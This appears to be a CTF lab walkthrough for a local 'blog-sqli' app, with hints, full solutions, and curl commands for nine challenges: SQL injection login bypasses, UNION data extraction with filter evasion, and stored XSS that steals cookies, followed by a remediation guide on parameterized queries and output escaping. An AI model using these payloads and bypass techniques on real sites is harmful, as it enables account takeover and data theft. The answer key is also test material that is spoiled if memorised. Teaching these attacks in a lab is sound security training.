# VulnLab CTF - `blog-sqli` Walkthrough & Solution Guide

This document provides step-by-step progressive hints, exact exploitation payloads, reproducible `curl` commands, and secure coding remediations for all 9 challenges in `blog-sqli`.

---

## 1. SQLi Login Bypass (`blog-sqli-login`)

The blog login portal is vulnerable to dynamic SQL concatenation in the authentication verification query:
```python
raw_query = f"SELECT id, username, password, role FROM users WHERE username = '{username}' AND password = '{password}'"
```

### Challenge 1: `blog-sqli-login-easy` (100 Pts)
- **Difficulty**: Easy
- **Defenses**: None. Inputs are directly concatenated into the SQL statement.

#### Progressive Hints
1. Observe how user input is placed between single quotes `'`.
2. Can you close the single quote and supply a tautology (`1=1`) that always evaluates to true?
3. Use SQL comment markers (`--` or `/*`) to nullify the remaining password check.

<details>
<summary>Solution</summary>

**Payload**:
```text
Username: ' OR 1=1--
Password: (any password)
```
or specifically targeted to the `admin` account:
```text
Username: admin'--
Password: (any password)
```

**Curl Command**:
```bash
curl -s -X POST "http://127.0.0.1:8001/login?difficulty=easy" \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' OR 1=1--", "password": "any"}'
```

**Expected Response**:
```json
{
  "flag": "$FLAG",
  "message": "Successfully authenticated as admin",
  "role": "admin",
  "success": true,
  "username": "admin"
}
```
</details>

---

### Challenge 2: `blog-sqli-login-medium` (200 Pts)
- **Difficulty**: Medium
- **Defenses**: The application applies a case-insensitive regex filter blocking `OR`, `AND`, and `--`.

#### Progressive Hints
1. Standard SQL comment `--` is blocked, but SQL supports multi-line block comments (`/* ... */`) and SQLite preprocessors accept hash comments (`#`).
2. Can you comment out the password check using `/*` or `#`?
3. Alternatively, can you bypass using logical OR alternatives such as `||`?

<details>
<summary>Solution</summary>

**Payload**:
```text
Username: admin'/*
Password: (any password)
```
or
```text
Username: admin' #
Password: (any password)
```
or
```text
Username: admin' || '1'='1
Password: (any password)
```

**Curl Command**:
```bash
curl -s -X POST "http://127.0.0.1:8001/login?difficulty=medium" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''/*", "password": "any"}'
```

**Expected Response**:
```json
{
  "flag": "$FLAG",
  "message": "Successfully authenticated as admin",
  "role": "admin",
  "success": true,
  "username": "admin"
}
```
</details>

---

### Challenge 3: `blog-sqli-login-hard` (300 Pts)
- **Difficulty**: Hard
- **Defenses**: All whitespace characters (spaces `' '`) and standard comment markers (`--`, `/*`, `#`) are rejected by the WAF.

#### Progressive Hints
1. Spaces are blocked, but SQL grammar allows tokens to be delimited by tab characters (`\t`), newlines (`\n`), or parentheses `()`.
2. Comments are blocked, so you cannot truncate the query. Instead, you must balance the trailing quotes: `WHERE username = '{username}' AND password = '{password}'`.
3. Group expressions with parentheses: `admin'OR('1'='1')OR''='`.

<details>
<summary>Solution</summary>

**Payload**:
```text
Username: admin'OR('1'='1')OR''='
Password: (any password)
```
or using tab delimiters (`\t`):
```text
Username: admin'	OR	''='
Password: (any password)
```

**Curl Command**:
```bash
curl -s -X POST "http://127.0.0.1:8001/login?difficulty=hard" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''OR('\''1'\''='\''1\'')OR'\'''\''='\''", "password": "any"}'
```

**Expected Response**:
```json
{
  "flag": "$FLAG",
  "message": "Successfully authenticated as admin",
  "role": "admin",
  "success": true,
  "username": "admin"
}
```
</details>

---

## 2. UNION-Based Data Extraction (`blog-sqli-union`)

The search feature performs a `LIKE` search across blog posts:
```python
sql_query = f"SELECT id, title, content, created_at, author FROM posts WHERE title LIKE '%{query}%' OR content LIKE '%{query}%'"
```

### Challenge 4: `blog-sqli-union-easy` (100 Pts)
- **Difficulty**: Easy
- **Defenses**: Direct string interpolation.

#### Progressive Hints
1. Determine the column count of the original query (5 columns: `id`, `title`, `content`, `created_at`, `author`).
2. Hidden flags are stored in the `flags` table with columns `id`, `name`, `flag`, `description`.
3. Use a `UNION SELECT` statement matching the 5 column types.

<details>
<summary>Solution</summary>

**Payload**:
```text
' UNION SELECT 1, name, flag, description, 'author' FROM flags--
```

**Curl Command**:
```bash
curl -s "http://127.0.0.1:8001/?difficulty=easy&q='%20UNION%20SELECT%201,%20name,%20flag,%20description,%20'author'%20FROM%20flags--" \
  -H "Accept: application/json"
```

**Expected Response**:
```json
{
  "results": [
    {
      "author": "author",
      "content": "$FLAG",
      "created_at": "UNION SQL Injection Easy Flag",
      "id": 1,
      "title": "flag_blog_sqli_union_easy"
    }
  ]
}
```
</details>

---

### Challenge 5: `blog-sqli-union-medium` (200 Pts)
- **Difficulty**: Medium
- **Defenses**: Single-pass, non-recursive stripping of `UNION` and `SELECT` keywords.

#### Progressive Hints
1. When inputting `UNION`, the filter removes it. What remains if you place the keyword inside itself?
2. Consider how `UNUNIONION` transforms when the inner `UNION` is stripped.
3. Apply the same technique to `SELECT` (`SELSELECTECT`).

<details>
<summary>Solution</summary>

**Payload**:
```text
' UNUNIONION SELSELECTECT 1, name, flag, description, 'author' FROM flags--
```

**Curl Command**:
```bash
curl -s "http://127.0.0.1:8001/?difficulty=medium&q='%20UNUNIONION%20SELSELECTECT%201,%20name,%20flag,%20description,%20'author'%20FROM%20flags--" \
  -H "Accept: application/json"
```

**Expected Response**:
```json
{
  "results": [
    {
      "author": "author",
      "content": "$FLAG",
      "created_at": "UNION SQL Injection Medium Flag",
      "id": 1,
      "title": "flag_blog_sqli_union_medium"
    }
  ]
}
```
</details>

---

### Challenge 6: `blog-sqli-union-hard` (300 Pts)
- **Difficulty**: Hard
- **Defenses**: Literal space characters `' '` are blocked and direct keyword sequences (`union\s+select`, `from\s+flags`) are forbidden.

#### Progressive Hints
1. Spaces are blocked, but SQL parsers accept inline comments `/**/` wherever whitespace is permitted.
2. Replace every space in your payload with `/**/`.
3. Notice that `UNION/**/SELECT` bypasses both the whitespace check and the `\s+` sequence regex.

<details>
<summary>Solution</summary>

**Payload**:
```text
'/**/UNION/**/SELECT/**/1,name,flag,description,'author'/**/FROM/**/flags--
```

**Curl Command**:
```bash
curl -s "http://127.0.0.1:8001/?difficulty=hard&q='%2F**%2FUNION%2F**%2FSELECT%2F**%2F1,name,flag,description,'author'%2F**%2FFROM%2F**%2Fflags--" \
  -H "Accept: application/json"
```

**Expected Response**:
```json
{
  "results": [
    {
      "author": "author",
      "content": "$FLAG",
      "created_at": "UNION SQL Injection Hard Flag",
      "id": 1,
      "title": "flag_blog_sqli_union_hard"
    }
  ]
}
```
</details>

---

## 3. Stored Cross-Site Scripting (`blog-sqli-xss`)

Blog comments are rendered in templates using Jinja's `| safe` filter. An administrative review bot simulates visiting comments with a privileged cookie containing the flag.

### Challenge 7: `blog-sqli-xss-easy` (100 Pts)
- **Difficulty**: Easy
- **Defenses**: No sanitization or filtering.

#### Progressive Hints
1. Comments are rendered as raw unescaped HTML.
2. Standard `<script>` elements will execute inside the admin's browser session.
3. Trigger the bot review using the UI button or `/api/admin/visit-comments`.

<details>
<summary>Solution</summary>

**Payload**:
```html
<script>fetch('/api/exfil?c=' + document.cookie)</script>
```

**Step 1: Submit Comment**:
```bash
curl -s -X POST "http://127.0.0.1:8001/post/1/comment?difficulty=easy" \
  -d "author_name=attacker&content=%3Cscript%3Efetch('/api/exfil?c='%2Bdocument.cookie)%3C/script%3E"
```

**Step 2: Trigger Admin Review**:
```bash
curl -s -X POST "http://127.0.0.1:8001/api/admin/visit-comments?difficulty=easy&post_id=1"
```

**Expected Response**:
```json
{
  "flag": "$FLAG",
  "message": "Admin bot visited the page and executed your injected payload! Admin session cookie compromised.",
  "status": "success",
  "xss_triggered": true
}
```
</details>

---

### Challenge 8: `blog-sqli-xss-medium` (200 Pts)
- **Difficulty**: Medium
- **Defenses**: Server-side filter strips lowercase `<script>` tags.

#### Progressive Hints
1. Lowercase `<script>` is removed, but case variants like `<SCRIPT>` or other HTML elements remain.
2. Many HTML elements (`<img>`, `<svg>`, `<body>`, `<iframe>`) support event attributes such as `onerror` or `onload`.
3. Try an `<img>` tag with an invalid `src` and an `onerror` handler.

<details>
<summary>Solution</summary>

**Payload**:
```html
<img src=x onerror="fetch('/api/exfil?c=' + document.cookie)">
```
or
```html
<SCRIPT>alert(document.cookie)</SCRIPT>
```

**Step 1: Submit Comment**:
```bash
curl -s -X POST "http://127.0.0.1:8001/post/1/comment?difficulty=medium" \
  -d "author_name=attacker&content=%3Cimg%20src=x%20onerror=%22alert(document.cookie)%22%3E"
```

**Step 2: Trigger Admin Review**:
```bash
curl -s -X POST "http://127.0.0.1:8001/api/admin/visit-comments?difficulty=medium&post_id=1"
```

**Expected Response**:
```json
{
  "flag": "$FLAG",
  "message": "Admin bot visited the page and executed your injected payload! Admin session cookie compromised.",
  "status": "success",
  "xss_triggered": true
}
```
</details>

---

### Challenge 9: `blog-sqli-xss-hard` (300 Pts)
- **Difficulty**: Hard
- **Defenses**: Case-insensitive stripping of `<script>` tags and whitespace-delimited `onerror` / `onload` handlers.

#### Progressive Hints
1. `<script>` and `\s+(onerror|onload)=` are stripped.
2. HTML specifications allow forward slashes `/` instead of whitespace between tags and attributes (e.g. `<svg/onload=...>`).
3. Alternatively, `<iframe>` elements with `srcdoc` or links with `javascript:` pseudo-protocols do not use `onerror` or `onload`.

<details>
<summary>Solution</summary>

**Payload**:
```html
<svg/onload=alert(document.cookie)>
```
or
```html
<iframe srcdoc="<svg/onload=alert(document.cookie)>"></iframe>
```
or
```html
<a href="javascript:alert(document.cookie)">Click to View</a>
```

**Step 1: Submit Comment**:
```bash
curl -s -X POST "http://127.0.0.1:8001/post/1/comment?difficulty=hard" \
  -d "author_name=attacker&content=%3Csvg/onload=alert(document.cookie)%3E"
```

**Step 2: Trigger Admin Review**:
```bash
curl -s -X POST "http://127.0.0.1:8001/api/admin/visit-comments?difficulty=hard&post_id=1"
```

**Expected Response**:
```json
{
  "flag": "$FLAG",
  "message": "Admin bot visited the page and executed your injected payload! Admin session cookie compromised.",
  "status": "success",
  "xss_triggered": true
}
```
</details>

---

## 4. Secure Coding & Remediation Guide

### How to Remediate SQL Injection
Never concatenate or format user input directly into SQL strings. Always utilize parameterized queries (prepared statements). The database driver handles escaping and tokenization safely.

#### Insecure Code (Vulnerable):
```python
# VULNERABLE: Direct string formatting allows syntax manipulation
query = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

#### Secure Code (Remediated):
```python
# SECURE: Parameterized prepared statement
query = "SELECT id, username, role FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

For `LIKE` clauses:
```python
# SECURE: Supply wildcards via parameters rather than raw concatenation
search_term = f"%{query}%"
cursor.execute("SELECT id, title, content FROM posts WHERE title LIKE ? OR content LIKE ?", (search_term, search_term))
```

---

### How to Remediate Cross-Site Scripting (XSS)
Never render untrusted user input using Jinja's `| safe` filter. Jinja2 automatically escapes HTML entities by default (`<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;`).

#### Insecure Template (Vulnerable):
```html
<!-- VULNERABLE: Disables automatic HTML escaping -->
<div class="comment-content">
  {{ comment.content | safe }}
</div>
```

#### Secure Template (Remediated):
```html
<!-- SECURE: Default contextual escaping prevents script injection -->
<div class="comment-content">
  {{ comment.content }}
</div>
```

#### Additional Defense-in-Depth Measures:
1. **Content Security Policy (CSP)**:
   Add a strict HTTP response header disallowing inline scripts and untrusted domains:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
   ```
2. **HttpOnly Cookie Flag**:
   Ensure sensitive session cookies cannot be read via JavaScript (`document.cookie`):
   ```python
   response.set_cookie('session_id', token, httponly=True, secure=True, samesite='Lax')
   ```
